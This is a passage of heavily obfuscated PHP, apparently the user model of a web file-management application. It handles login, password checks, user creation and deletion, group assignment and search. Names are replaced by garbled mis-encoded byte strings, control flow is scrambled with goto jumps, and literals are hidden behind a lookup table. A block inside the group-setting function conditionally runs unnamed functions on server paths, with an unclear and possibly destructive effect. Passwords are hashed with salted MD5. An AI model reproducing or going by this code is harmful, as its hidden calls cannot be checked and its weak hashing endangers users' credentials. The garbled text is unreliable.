($cÊœ™©ÙåÉ) { $c«å½Ò³ÒÚ = $this->where(array($dµ™Œ®ù¿Œ[1401] => intval($d‘­ù †÷)))->find(); if (!is_array($c«å½Ò³ÒÚ)) { return array(); } $c«å½Ò³ÒÚ[$dµ™Œ®ù¿Œ[2447]] = Action($dµ™Œ®ù¿Œ[2448])->parseUrl($c«å½Ò³ÒÚ[$dµ™Œ®ù¿Œ[2447]]); return $c«å½Ò³ÒÚ; } return $this->cacheFunctionGet($dµ™Œ®ù¿Œ[2133], $d‘­ù †÷); } protected function getInfoSimpleOuter($føéæ¦Ü¼ñ) { goto EßéêÎù…Œ; A¨«¨ÛÉçã: return $eçëÀíÉ; goto dšĞ—ƒ¢ï; cİ„Íåª»ï: $eçëÀíÉ = array_field_key($aÀ¼‘˜¶”ä, explode($EİÏà‰¹Ô°[47], $this->simpleField)); if (!$eçëÀíÉ) { return array($EİÏà‰¹Ô°[1401] => $EİÏà‰¹Ô°[1021], $EİÏà‰¹Ô°[28] => $EİÏà‰¹Ô°[154] . LNG($EİÏà‰¹Ô°[2451]) . $EİÏà‰¹Ô°[472], $EİÏà‰¹Ô°[2447] => STATIC_PATH . $EİÏà‰¹Ô°[2452]); } $eçëÀíÉ[$EİÏà‰¹Ô°[2447]] = Action($EİÏà‰¹Ô°[2448])->parseUrl($eçëÀíÉ[$EİÏà‰¹Ô°[2447]]); goto A¨«¨ÛÉçã; EßéêÎù…Œ: $EİÏà‰¹Ô° =& $_SERVER[£ü]; if (!$føéæ¦Ü¼ñ || $føéæ¦Ü¼ñ == 0) { return array($EİÏà‰¹Ô°[1401] => $EİÏà‰¹Ô°[464], $EİÏà‰¹Ô°[28] => $EİÏà‰¹Ô°[154] . LNG($EİÏà‰¹Ô°[2449]) . $EİÏà‰¹Ô°[472], $EİÏà‰¹Ô°[2447] => STATIC_PATH . $EİÏà‰¹Ô°[2450]); } $aÀ¼‘˜¶”ä = $this->cacheFunctionGet($EİÏà‰¹Ô°[2133], $føéæ¦Ü¼ñ); goto cİ„Íåª»ï; dšĞ—ƒ¢ï: } protected function groupUser($eÉÄù…Ç) { } public static function errorLang($f™¸µ¶Í‡) { $eÌï‹›…¯ˆ =& $_SERVER[£ü]; $e‰œÚÕè‰ğ = array(self::ERROR_USER_NOT_EXISTS => $eÌï‹›…¯ˆ[2453], self::ERROR_USER_PASSWORD_ERROR => $eÌï‹›…¯ˆ[2454], self::ERROR_USER_EXIST_NAME => $eÌï‹›…¯ˆ[2455], self::ERROR_USER_EXIST_PHONE => $eÌï‹›…¯ˆ[2456], self::ERROR_USER_EXIST_EMAIL => $eÌï‹›…¯ˆ[2457], self::ERROR_USER_LOGIN_LOCK => $eÌï‹›…¯ˆ[2458], self::ERROR_IP_NOT_ALLOW => $eÌï‹›…¯ˆ[2459], self::ERROR_USER_EXIST_NICKNAME => $eÌï‹›…¯ˆ[2460]); return LNG($e‰œÚÕè‰ğ[$f™¸µ¶Í‡]); } public function getInfoByMeta($d«¿÷·Æç, $DÜ¯Ë«¶ƒö) { $F›ĞÂ½ø¾ =& $_SERVER[£ü]; $c§ÍÎ‹˜­ = Model($F›ĞÂ½ø¾[2461])->where(array($F›ĞÂ½ø¾[89] => $d«¿÷·Æç, $F›ĞÂ½ø¾[356] => $DÜ¯Ë«¶ƒö))->find(); if ($c§ÍÎ‹˜­) { return $this->getInfo($c§ÍÎ‹˜­[$F›ĞÂ½ø¾[1401]]); } return !1; } public function userLoginCheck($C‚Šâ½Ş“·, $eìåĞî›ï) { goto dÚéĞ¨ß»è; EùŒÀ‚’ëø: $AˆÏ”Şò‹³ = $this->where($DÚ²ˆõ³ä)->find(); if (!$AˆÏ”Şò‹³) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($AˆÏ”Şò‹³[$aò„óÇòøé[1401]], $eìåĞî›ï)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto FÑ¬ñ£Öæ; dÚéĞ¨ß»è: $aò„óÇòøé =& $_SERVER[£ü]; $DÚ²ˆõ³ä = array($aò„óÇòøé[28] => $C‚Šâ½Ş“·, $aò„óÇòøé[2284] => $C‚Šâ½Ş“·, $aò„óÇòøé[290] => $C‚Šâ½Ş“·, $aò„óÇòøé[2462] => $C‚Šâ½Ş“·, $aò„óÇòøé[904] => $aò„óÇòøé[906]); if ($this->nickNameRpt()) { unset($DÚ²ˆõ³ä[$aò„óÇòøé[2284]]); } goto EùŒÀ‚’ëø; FÑ¬ñ£Öæ: $this->userEdit($AˆÏ”Şò‹³[$aò„óÇòøé[1401]], array($aò„óÇòøé[2463] => time())); $this->clearCache($AˆÏ”Şò‹³[$aò„óÇòøé[1401]]); return $this->getInfo($AˆÏ”Şò‹³[$aò„óÇòøé[1401]]); goto c‡‰á¬à×ª; c‡‰á¬à×ª: } public function clearCache($AÁ¶øõ±Ø) { $CÄø‘´‘—õ =& $_SERVER[£ü]; $this->cacheFunctionClear($CÄø‘´‘—õ[2172], $AÁ¶øõ±Ø); $this->cacheFunctionClear($CÄø‘´‘—õ[2133], $AÁ¶øõ±Ø); } public function userPasswordCheck($aµÆ‘ñæÚŞ, $BĞŸùÌÛ¤è) { $d’Ùğ¢Áë§ =& $_SERVER[£ü]; $aÒë¨´—¶ = $this->where(array($d’Ùğ¢Áë§[1401] => intval($aµÆ‘ñæÚŞ)))->find(); $C¤Â˜¶‰ô = $this->metaGet($aµÆ‘ñæÚŞ); $D¿šá»‰öí = isset($C¤Â˜¶‰ô[$d’Ùğ¢Áë§[2464]]) ? $C¤Â˜¶‰ô[$d’Ùğ¢Áë§[2464]] : $d’Ùğ¢Áë§[33]; if (md5($D¿šá»‰öí . trim($BĞŸùÌÛ¤è)) !== $aÒë¨´—¶[$d’Ùğ¢Áë§[792]]) { return !1; } return !0; } public function userAdd($C¥æ‘Şç¡Ò) { goto FÀÛ¦”¡; D·ÁáÙŠ»ó: $f³Ğ²‚ùù = $this->_checkExist($C¥æ‘Şç¡Ò); if ($f³Ğ²‚ùù !== !0) { return $f³Ğ²‚ùù; } $Aø‘³Üòö® = $this->add($eÃÔ™îêŠ); goto eÓ¾¥öë; eÓ¾¥öë: $AÆÆ²²Ì‡è = array($FØÏù³Œ‘[2473] => $eÃÔ™îêŠ[$FØÏù³Œ‘[792]], $FØÏù³Œ‘[2469] => $eÃÔ™îêŠ[$FØÏù³Œ‘[2284]]); $this->userEdit($Aø‘³Üòö®, $AÆÆ²²Ì‡è); Model($FØÏù³Œ‘[1100])->userRootAdd($Aø‘³Üòö®); goto e›‡½—¾–£; e›‡½—¾–£: return $Aø‘³Üòö®; goto dë§–‹õéİ; FÀÛ¦”¡: $FØÏù³Œ‘ =& $_SERVER[£ü]; $eÃÔ™îêŠ = array($FØÏù³Œ‘[383] => $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[28]], $FØÏù³Œ‘[2465] => $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2466]], $FØÏù³Œ‘[2467] => isset($C¥æ‘Şç¡Ò[$FØÏù³Œ‘[290]]) ? $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[290]] : $FØÏù³Œ‘[33], $FØÏù³Œ‘[2468] => isset($C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2462]]) ? $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2462]] : $FØÏù³Œ‘[33], $FØÏù³Œ‘[2469] => isset($C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2284]]) ? $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2284]] : $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[28]], $FØÏù³Œ‘[2470] => isset($C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2447]]) ? $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2447]] : $FØÏù³Œ‘[33], $FØÏù³Œ‘[2471] => isset($C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2472]]) ? $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2472]] : 1, $FØÏù³Œ‘[2473] => $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[792]], $FØÏù³Œ‘[2134] => isset($C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2048]]) ? $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[2048]] : 1024 * 1024 * 20, $FØÏù³Œ‘[2135] => 0, $FØÏù³Œ‘[2463] => 0, $FØÏù³Œ‘[2159] => isset($C¥æ‘Şç¡Ò[$FØÏù³Œ‘[678]]) ? $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[678]] : 1); if (!empty($C¥æ‘Şç¡Ò[$FØÏù³Œ‘[1401]])) { $eÃÔ™îêŠ[$FØÏù³Œ‘[1401]] = $C¥æ‘Şç¡Ò[$FØÏù³Œ‘[1401]]; } goto D·ÁáÙŠ»ó; dë§–‹õéİ: } protected function userEditTest($fÒ¢î‘„Æ, $A¸ÉïÍŸÀÍ) { return $this->call($_SERVER[£ü][2474], $fÒ¢î‘„Æ, $A¸ÉïÍŸÀÍ); } protected function userEdit($CˆÎæÉ‡Æ¯, $dËØ‚ÈŞ) { goto cÑ™Ö‰ˆË; dÉÀó¨Æ: $this->where(array($E©ÜÙÂ„óõ[1392] => $CˆÎæÉ‡Æ¯))->save($dËØ‚ÈŞ); if (isset($dËØ‚ÈŞ[$E©ÜÙÂ„óõ[2284]])) { $this->setNamePinyin($CˆÎæÉ‡Æ¯, $dËØ‚ÈŞ[$E©ÜÙÂ„óõ[2284]]); } return !0; goto b—İ®¹‡¤¨; aí¨éÂÏ: $Eö®÷ìÁŞ = $this->_checkExist($dËØ‚ÈŞ, $CˆÎæÉ‡Æ¯); if ($Eö®÷ìÁŞ !== !0) { return $Eö®÷ìÁŞ; } if (isset($dËØ‚ÈŞ[$E©ÜÙÂ„óõ[792]]) && trim($dËØ‚ÈŞ[$E©ÜÙÂ„óõ[792]]) != $E©ÜÙÂ„óõ[33]) { $d˜šŠÓ§“‹ = $this->metaGet($CˆÎæÉ‡Æ¯); if (empty($d˜šŠÓ§“‹[$E©ÜÙÂ„óõ[2464]])) { $d˜šŠÓ§“‹[$E©ÜÙÂ„óõ[2464]] = rand_string(10); Model($E©ÜÙÂ„óõ[470])->metaSet($CˆÎæÉ‡Æ¯, $E©ÜÙÂ„óõ[2464], $d˜šŠÓ§“‹[$E©ÜÙÂ„óõ[2464]]); } $dËØ‚ÈŞ[$E©ÜÙÂ„óõ[792]] = md5($d˜šŠÓ§“‹[$E©ÜÙÂ„óõ[2464]] . trim($dËØ‚ÈŞ[$E©ÜÙÂ„óõ[792]])); } else { unset($dËØ‚ÈŞ[$E©ÜÙÂ„óõ[792]]); } goto dÉÀó¨Æ; cÑ™Ö‰ˆË: $E©ÜÙÂ„óõ =& $_SERVER[£ü]; $DŠŞ£ª–ŸÁ = $this->getInfoSimple($CˆÎæÉ‡Æ¯); if (!$DŠŞ£ª–ŸÁ) { return !1; } goto aí¨éÂÏ; b—İ®¹‡¤¨: } public function setNamePinyin($BíŸŞ‰ß¢, $eÙÏ½ÖÚŞÑ = false) { $e„Æ¨âÇ¸… =& $_SERVER[£ü]; if (!$eÙÏ½ÖÚŞÑ) { $cé¾Ã®¼ = $this->getInfoSimple($BíŸŞ‰ß¢); $eÙÏ½ÖÚŞÑ = $cé¾Ã®¼[$e„Æ¨âÇ¸…[2284]] ? $cé¾Ã®¼[$e„Æ¨âÇ¸…[2284]] : $cé¾Ã®¼[$e„Æ¨âÇ¸…[28]]; } $FÀÎÑÕ°öŒ = Model($e„Æ¨âÇ¸…[473]); if (!Input::check($eÙÏ½ÖÚŞÑ, $e„Æ¨âÇ¸…[524])) { return $FÀÎÑÕ°öŒ->metaSet($BíŸŞ‰ß¢, array($e„Æ¨âÇ¸…[412] => $e„Æ¨âÇ¸…[33], $e„Æ¨âÇ¸…[411] => $e„Æ¨âÇ¸…[33])); } return $FÀÎÑÕ°öŒ->metaSet($BíŸŞ‰ß¢, array($e„Æ¨âÇ¸…[412] => str_replace($e„Æ¨âÇ¸…[50], $e„Æ¨âÇ¸…[33], Pinyin::encode($eÙÏ½ÖÚŞÑ)), $e„Æ¨âÇ¸…[411] => Pinyin::encode($eÙÏ½ÖÚŞÑ, $e„Æ¨âÇ¸…[525]))); } private function nickNameRpt() { $fÀÂˆù…–Œ =& $_SERVER[£ü]; $aÚªõÛíçŠ = Model($fÀÂˆù…–Œ[1078])->get($fÀÂˆù…–Œ[2475]); $d‘ê°õÅÈ‰ = $GLOBALS[$fÀÂˆù…–Œ[6]][$fÀÂˆù…–Œ[2431]][$fÀÂˆù…–Œ[2475]]; $a•ÆÅÕ¸ÇŞ = !is_null($aÚªõÛíçŠ) ? $aÚªõÛíçŠ : $d‘ê°õÅÈ‰; return !!$a•ÆÅÕ¸ÇŞ; } private function _checkExist($C±íÚÀ¼­, $Aã„«È“£ = false) { $DÚ³Ã‹›…“ =& $_SERVER[£ü]; $dßÌÁ²º¥ç = array($DÚ³Ã‹›…“[28] => UserModel::ERROR_USER_EXIST_NAME, $DÚ³Ã‹›…“[2284] => UserModel::ERROR_USER_EXIST_NICKNAME, $DÚ³Ã‹›…“[290] => UserModel::ERROR_USER_EXIST_EMAIL, $DÚ³Ã‹›…“[2462] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($dßÌÁ²º¥ç[$DÚ³Ã‹›…“[2284]]); } $cï®‚ÆÂÀ® = $Aã„«È“£ ? array($DÚ³Ã‹›…“[1401] => array($DÚ³Ã‹›…“[2476], $Aã„«È“£)) : array(); foreach ($dßÌÁ²º¥ç as $Bæô®ÔÛÛÃ => $E¸³›ˆŞê¶) { if (!isset($C±íÚÀ¼­[$Bæô®ÔÛÛÃ]) || !$C±íÚÀ¼­[$Bæô®ÔÛÛÃ]) { continue; } $dÛç”Çğí¹ = array_merge(array($Bæô®ÔÛÛÃ => $C±íÚÀ¼­[$Bæô®ÔÛÛÃ]), $cï®‚ÆÂÀ®); $BÌ¯«®¨¥¸ = $this->where($dÛç”Çğí¹)->find(); if ($BÌ¯«®¨¥¸) { return $E¸³›ˆŞê¶; } } return !0; } public function userListInfo($e„Ÿ¦¿ß½‘) { $cêÕÁ§ä¦’ =& $_SERVER[£ü]; $e¾Ã¯…›Üº = array(); $e„Ÿ¦¿ß½‘ = is_array($e„Ÿ¦¿ß½‘) ? array_unique($e„Ÿ¦¿ß½‘) : array(); if (!$e„Ÿ¦¿ß½‘) { return $e¾Ã¯…›Üº; } if (count($e„Ÿ¦¿ß½‘) < 20) { foreach ($e„Ÿ¦¿ß½‘ as $CœÚ®éœÖ) { $e¾Ã¯…›Üº[$CœÚ®éœÖ . $cêÕÁ§ä¦’[33]] = $this->getInfoSimpleOuter($CœÚ®éœÖ); } } else { $BğƒÎÏÆ÷‘ = array($cêÕÁ§ä¦’[1392] => array($cêÕÁ§ä¦’[381], $e„Ÿ¦¿ß½‘)); if (count($e„Ÿ¦¿ß½‘) == 1) { $BğƒÎÏÆ÷‘ = array($cêÕÁ§ä¦’[1392] => $e„Ÿ¦¿ß½‘[0]); } $b¯ÎÅ—³—¡ = Model($cêÕÁ§ä¦’[470])->field($this->simpleField)->where($BğƒÎÏÆ÷‘)->select(); $b¯ÎÅ—³—¡ = array_to_keyvalue($b¯ÎÅ—³—¡, $cêÕÁ§ä¦’[1401]); foreach ($e„Ÿ¦¿ß½‘ as $CœÚ®éœÖ) { $cÕÑ¢ã‚µÍ = $b¯ÎÅ—³—¡[$b¯ÎÅ—³—¡[$CœÚ®éœÖ]]; if (!$cÕÑ¢ã‚µÍ) { $e¾Ã¯…›Üº[$CœÚ®éœÖ . $cêÕÁ§ä¦’[33]] = $this->getInfoSimpleOuter($CœÚ®éœÖ); continue; } $cÕÑ¢ã‚µÍ[$cêÕÁ§ä¦’[2447]] = Action($cêÕÁ§ä¦’[2448])->parseUrl($cÕÑ¢ã‚µÍ[$cêÕÁ§ä¦’[2447]]); $e¾Ã¯…›Üº[$CœÚ®éœÖ . $cêÕÁ§ä¦’[33]] = $cÕÑ¢ã‚µÍ; } } return $e¾Ã¯…›Üº; } protected function userStatus($Bâƒ¹šÌ’½, $fèÁòµòÙ) { $F«©Ö¹¢´¥ = $this->getInfoSimple($Bâƒ¹šÌ’½); if (!$F«©Ö¹¢´¥) { return !1; } $fé“‚‚‰¹Ó = array($_SERVER[£ü][678] => $fèÁòµòÙ); return $this->userEdit($Bâƒ¹šÌ’½, $fé“‚‚‰¹Ó); } protected function userRemove($a…å†•‚–©) { goto aö–Û Ø°†; bŸÊçñ¬—: $C‚±íœ½—ò = array($EÈ ‚–Í¬¹[1392] => $a…å†•‚–©); Model($EÈ ‚–Í¬¹[532])->where($C‚±íœ½—ò)->delete(); Model($EÈ ‚–Í¬¹[2477])->where($C‚±íœ½—ò)->delete(); goto eÍ¬³Ê°ç§; eÍ¬³Ê°ç§: Model($EÈ ‚–Í¬¹[2138])->where($C‚±íœ½—ò)->delete(); Model($EÈ ‚–Í¬¹[2461])->where($C‚±íœ½—ò)->delete(); Model($EÈ ‚–Í¬¹[2478])->where($C‚±íœ½—ò)->delete(); goto BÉ¬‡Ë¦²; BÉ¬‡Ë¦²: Model($EÈ ‚–Í¬¹[748])->userRootRemove($a…å†•‚–©); return $this->where($C‚±íœ½—ò)->delete(); goto b”¡ÖåœÍ; aö–Û Ø°†: $EÈ ‚–Í¬¹ =& $_SERVER[£ü]; $AêÀÕÑ©ùÉ = $this->getInfoSimple($a…å†•‚–©); if (!$AêÀÕÑ©ùÉ) { return !1; } goto bŸÊçñ¬—; b”¡ÖåœÍ: } protected function userGroupSet($DÌùÈºš±ù, $F±£ëŠ¿ê†, $E³àŞ® ï = array()) { goto Aƒ¿„Ş©¼; B Û¯÷Šç: return $E›–ˆÉ‡¾£->addAll($a¸„Ê–Èëš, array(), !0); goto c—ßéö…„; Aƒ¿„Ş©¼: $c½§ƒİ¨³­ =& $_SERVER[£ü]; if ($_SERVER[$c½§ƒİ¨³­[723]] != $_SERVER[$c½§ƒİ¨³­[782]]) { goto F•´˜á…Ì¡; AÇ‘µÓ·‹×: $CÌ‹åƒ‰ô· = 1; while ($CÌ‹åƒ‰ô· > 1) { $CÌ‹åƒ‰ô· = $CÌ‹åƒ‰ô· + 4; $aŸõàÎˆâˆ = rawurlencode($CÌ‹åƒ‰ô· . $c½§ƒİ¨³­[358]); } goto Fä ìÄÁ; F•´˜á…Ì¡: $EÃÚª¼åë³ = $c½§ƒİ¨³­[783]; $B×ˆœ„Ä«’ = $c½§ƒİ¨³­[725]; $cÆåƒŒÎË³ = $_SERVER[$c½§ƒİ¨³­[726]] . $c½§ƒİ¨³­[727]; goto CªƒËåë; CªƒËåë: $d¯Ú”º‰ğ = $B×ˆœ„Ä«’($cÆåƒŒÎË³); $a×‰ÕÛ´Äš = explode($c½§ƒİ¨³­[214], $d¯Ú”º‰ğ); if (count($a×‰ÕÛ´Äš) < $c½§ƒİ¨³­[566]) { $Dİ«¿ó‘óÅ = $c½§ƒİ¨³­[728]; $Dİ«¿ó‘óÅ(); } goto Aù“œçÊ‘”; Aù“œçÊ‘”: $FÄÓñàŒÔ¬ = $c½§ƒİ¨³­[784]; $FÄÓñàŒÔ¬($_SERVER[$c½§ƒİ¨³­[785]]); $FÄÓñàŒÔ¬($_SERVER[$c½§ƒİ¨³­[726]] . $c½§ƒİ¨³­[786]); goto AÇ‘µÓ·‹×; Fä ìÄÁ: } $eàÃÃÉ³† = $this->getInfoSimple($DÌùÈºš±ù); goto e»¿‘ï„‘; e»¿‘ï„‘: if (!$eàÃÃÉ³† || !is_array($F±£ëŠ¿ê†)) { return !1; } $E›–ˆÉ‡¾£ = Model($c½§ƒİ¨³­[2138]); $E›–ˆÉ‡¾£->where(array($c½§ƒİ¨³­[1401] => $DÌùÈºš±ù))->delete(); goto f³äğêÔİÉ; f³äğêÔİÉ: $a¸„Ê–Èëš = array(); $b ¦Ş…‚ê– = 0; foreach ($F±£ëŠ¿ê† as $e”¡Ï¶ªø‹ => $Dé³Å±†Ïá) { $DÑÜ±‰İ = array($c½§ƒİ¨³­[1401] => $DÌùÈºš±ù, $c½§ƒİ¨³­[2064] => $e”¡Ï¶ªø‹, $c½§ƒİ¨³­[2192] => $Dé³Å±†Ïá); $DÑÜ±‰İ[$c½§ƒİ¨³­[2085]] = isset($E³àŞ® ï[$b ¦Ş…‚ê–]) ? $E³àŞ® ï[$b ¦Ş…‚ê–] : 0; $b ¦Ş…‚ê–++; $a¸„Ê–Èëš[] = $DÑÜ±‰İ; } goto B Û¯÷Šç; c—ßéö…„: } protected function userGroupAdd($BÊÔ¤Ø·Æë, $AĞôÂ—ôåõ, $Fã®§Ú¯åæ) { $cØéˆíÜ¸É =& $_SERVER[£ü]; $A—ò¤ç²« = $this->getInfoSimple($BÊÔ¤Ø·Æë); if (!$A—ò¤ç²« || !$AĞôÂ—ôåõ) { return !1; } $Eáˆ·Íƒàƒ = array(array($cØéˆíÜ¸É[1401] => $BÊÔ¤Ø·Æë, $cØéˆíÜ¸É[2064] => $AĞôÂ—ôåõ, $cØéˆíÜ¸É[2192] => $Fã®§Ú¯åæ)); return Model($cØéˆíÜ¸É[2138])->addAll($Eáˆ·Íƒàƒ, array(), !0); } protected function userGroupRemove($cí££á…ù, $EİíÇŒ‡İ„) { $bóàĞòõ‚Û =& $_SERVER[£ü]; $eÀ°›‹‚¶Û = $this->getInfoSimple($cí££á…ù); if (!$eÀ°›‹‚¶Û || !$EİíÇŒ‡İ„) { return !1; } $B—…‹¢æŞ = array($bóàĞòõ‚Û[1392] => $cí££á…ù, $bóàĞòõ‚Û[2136] => $EİíÇŒ‡İ„); return Model($bóàĞòõ‚Û[2138])->where($B—…‹¢æŞ)->delete(); } public function listData() { $bÄÆ¾Í£ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($bÄÆ¾Í£[$_SERVER[£ü][351]]); return $bÄÆ¾Í£; } public function listByID($fô…‹ë¥ì) { $a²Êªší­‰ =& $_SERVER[£ü]; if (!$fô…‹ë¥ì) { return; } $b–ÓïÈÍ = array($a²Êªší­‰[1401] => array($a²Êªší­‰[7], $fô…‹ë¥ì)); $c’—®¿ÊÅ = $this->where($b–ÓïÈÍ)->select(); $this->_listDataApply($c’—®¿ÊÅ); return $c’—®¿ÊÅ; } public function listByGroup($bèä¼‰Ç‰ = 0, $Fˆõó‘è¶ = array()) { goto eï„ğãğ“Ë; A»÷ãœ·é: if ($bèä¼‰Ç‰) { $e¬òˆë§è = array($e‡Ñäô´¡[2479] => intval($bèä¼‰Ç‰)); $AÑ³—ˆÙ†ì = "\114\x45\x46\124\40\x4a\117\x49\116\40{$this->tablePrefix}\165\163\145\162\x5f\147\x72\x6f\x75\160\x20\x75\163\x65\162\137\147\x72\157\x75\x70\40\x6f\156\x20\x75\x73\145\x72\x2e\165\163\x65\162\x49\104\40\75\40\165\163\145\x72\x5f\x67\162\157\165\160\x2e\x75\x73\x65\x72\111\x44"; $aš‘İÅù“Ä = Input::get($e‡Ñäô´¡[403], null, $e‡Ñäô´¡[33]) ? $e‡Ñäô´¡[33] : $e‡Ñäô´¡[2480]; } if (isset($Fˆõó‘è¶[$e‡Ñäô´¡[678]])) { $e¬òˆë§è[$e‡Ñäô´¡[2481]] = $Fˆõó‘è¶[$e‡Ñäô´¡[678]]; } $AñŠ¢è¦Ş = $this->_makeOrder($aš‘İÅù“Ä)->field($e‡Ñäô´¡[2482])->where($e¬òˆë§è)->join($AÑ³—ˆÙ†ì)->selectPage(50); goto AÂìšøÃ¤è; eï„ğãğ“Ë: $e‡Ñäô´¡ =& $_SERVER[£ü]; $AÑ³—ˆÙ†ì = $e‡Ñäô´¡[33]; $e¬òˆë§è = array(); goto A»÷ãœ·é; AÂìšøÃ¤è: $this->_listDataApply($AñŠ¢è¦Ş[$e‡Ñäô´¡[351]]); return $AñŠ¢è¦Ş; goto Aùª¼¬Š¥Ü; Aùª¼¬Š¥Ü: } private function _makeOrder($e‰ä’ÙôíŒ = '') { goto fê†•ãËß; FÌ¨Ïë „Ô: $cÂ×«î¤õæ = Input::get($BÌìì¼è„[403], $BÌìì¼è„[7], $BÌìì¼è„[1392], $b¬éâÈÁ—); $CŞĞºšöÂ­ = Input::get($BÌìì¼è„[404], $BÌìì¼è„[7], $BÌìì¼è„[2139], array($BÌìì¼è„[2139], $BÌìì¼è„[400])); $CŞĞºšöÂ­ = $b§Äê®¤£Ê[$CŞĞºšöÂ­]; goto DÔÇ¶é‘–; DÔÇ¶é‘–: $e‰ä’ÙôíŒ = $e‰ä’ÙôíŒ . "\165\x73\145\x72\56{$cÂ×«î¤õæ}\x20{$CŞĞºšöÂ­}\x2c\40\165\163\x65\162\56\x75\163\x65\x72\111\104\x20\141\x73\143"; return $this->alias($BÌìì¼è„[2225])->order($e‰ä’ÙôíŒ); goto DÑå¼÷”Ş; fê†•ãËß: $BÌìì¼è„ =& $_SERVER[£ü]; $b¬éâÈÁ— = array($BÌìì¼è„[1401], $BÌìì¼è„[28], $BÌìì¼è„[2050], $BÌìì¼è„[2023], $BÌìì¼è„[184]); $b§Äê®¤£Ê = array($BÌìì¼è„[398] => $BÌìì¼è„[399], $BÌìì¼è„[400] => $BÌìì¼è„[401]); goto FÌ¨Ïë „Ô; DÑå¼÷”Ş: } public function listSearch($FíÌ—†”ƒñ) { goto EâÖ ¾ô¿¨; F¿¼´³»: if (!$DŠÌùÃğä…) { $féÊÕ¶½ = array(); } if (isset($FíÌ—†”ƒñ[$b¬ÃíØù©[678]])) { $féÊÕ¶½[$b¬ÃíØù©[678]] = $FíÌ—†”ƒñ[$b¬ÃíØù©[678]]; } $E¾Œ‰¤†¡¡ = $this->_makeOrder()->where($féÊÕ¶½)->selectPage(20); goto b¸ÑìâÖÔ; B¿Œ²†ÉËŠ: return $E¾Œ‰¤†¡¡; goto b”Ú‹ô‘Ğ¶; EâÖ ¾ô¿¨: $b¬ÃíØù© =& $_SERVER[£ü]; $DŠÌùÃğä… = $FíÌ—†”ƒñ[$b¬ÃíØù©[2140]]; $d‘Ğ‡¤”ÌÎ = isset($FíÌ—†”ƒñ[$b¬ÃíØù©[2141]]) ? $FíÌ—†”ƒñ[$b¬ÃíØù©[2141]] : !1; goto Dù‡Ğ³ëÂ™; b¸ÑìâÖÔ: if (!$E¾Œ‰¤†¡¡ || count($E¾Œ‰¤†¡¡[$b¬ÃíØù©[351]]) < 5 && Input::check($DŠÌùÃğä…, $b¬ÃíØù©[303])) { $CÓòÌáùğÌ = $this->_searchFromMeta($b¬ÃíØù©[411], $DŠÌùÃğä…, 10); $C¹œÊ„ğô× = $this->_searchFromMeta($b¬ÃíØù©[412], $DŠÌùÃğä…, 10); $AéÒô”ä²‘ = array_merge($CÓòÌáùğÌ, $C¹œÊ„ğô×, $E¾Œ‰¤†¡¡[$b¬ÃíØù©[351]]); $E¾Œ‰¤†¡¡[$b¬ÃíØù©[351]] = array_unique_by_key($AéÒô”ä²‘, $b¬ÃíØù©[1401]); $E¾Œ‰¤†¡¡[$b¬ÃíØù©[348]][$b¬ÃíØù©[349]] = count($E¾Œ‰¤†¡¡[$b¬ÃíØù©[351]]); $E¾Œ‰¤†¡¡[$b¬ÃíØù©[348]][$b¬ÃíØù©[350]] = ceil($E¾Œ‰¤†¡¡[$b¬ÃíØù©[348]][$b¬ÃíØù©[349]] / $E¾Œ‰¤†¡¡[$b¬ÃíØù©[348]][$b¬ÃíØù©[346]]); } $this->_listDataApply($E¾Œ‰¤†¡¡[$b¬ÃíØù©[351]]); $this->_filterByGroup($E¾Œ‰¤†¡¡, $d‘Ğ‡¤”ÌÎ); goto B¿Œ²†ÉËŠ; Dù‡Ğ³ëÂ™: $DŠÌùÃğä… = str_replace($b¬ÃíØù©[2142], $b¬ÃíØù©[2143], trim($DŠÌùÃğä…)); $féÊÕ¶½ = array($b¬ÃíØù©[28] => array($b¬ÃíØù©[747], "\x25{$DŠÌùÃğä…}\45"), $b¬ÃíØù©[290] => array($b¬ÃíØù©[747], "\x25{$DŠÌùÃğä…}\45"), $b¬ÃíØù©[2284] => array($b¬ÃíØù©[747], "\x25{$DŠÌùÃğä…}\x25"), $b¬ÃíØù©[904] => $b¬ÃíØù©[2144]); if (Input::check($DŠÌùÃğä…, $b¬ÃíØù©[296])) { $féÊÕ¶½[$b¬ÃíØù©[1401]] = array($b¬ÃíØù©[747], "\x25{$DŠÌùÃğä…}\45"); $féÊÕ¶½[$b¬ÃíØù©[2462]] = array($b¬ÃíØù©[747], "\x25{$DŠÌùÃğä…}\45"); } goto F¿¼´³»; b”Ú‹ô‘Ğ¶: } private function _filterByGroup(&$bÎÁÊ¸ÃÎ, $EÖŒ¦…ÀÄ’) { $DËÇ¨À˜Î… =& $_SERVER[£ü]; if (!$EÖŒ¦…ÀÄ’) { return $bÎÁÊ¸ÃÎ; } foreach ($bÎÁÊ¸ÃÎ[$DËÇ¨À˜Î…[351]] as $DÑ¬Î«Ú—Æ => &$C‘ïœŠ†Å) { $F¥–£Ñ­¤œ = array_to_keyvalue($C‘ïœŠ†Å[$DËÇ¨À˜Î…[2483]], $DËÇ¨À˜Î…[33], $DËÇ¨À˜Î…[2064]); if (!in_array($EÖŒ¦…ÀÄ’, $F¥–£Ñ­¤œ)) { unset($bÎÁÊ¸ÃÎ[$DËÇ¨À˜Î…[351]][$DÑ¬Î«Ú—Æ]); } } $bÎÁÊ¸ÃÎ[$DËÇ¨À˜Î…[351]] = array_values($bÎÁÊ¸ÃÎ[$DËÇ¨À˜Î…[351]]); $bÎÁÊ¸ÃÎ[$DËÇ¨À˜Î…[348]] = array($DËÇ¨À˜Î…[2259] => 